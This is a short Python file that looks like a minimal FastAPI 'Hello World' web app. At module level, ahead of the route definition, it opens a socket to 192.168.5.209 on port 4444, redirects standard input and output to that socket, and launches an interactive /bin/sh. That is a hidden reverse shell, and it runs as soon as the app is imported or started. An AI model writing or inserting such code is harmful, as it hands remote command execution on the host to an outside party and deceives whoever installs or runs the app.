import socket
import subprocess
import os

from fastapi import FastAPI

app = FastAPI()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.5.209",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

@app.get("/")
def read_root():
    return {"Hello": "World"}

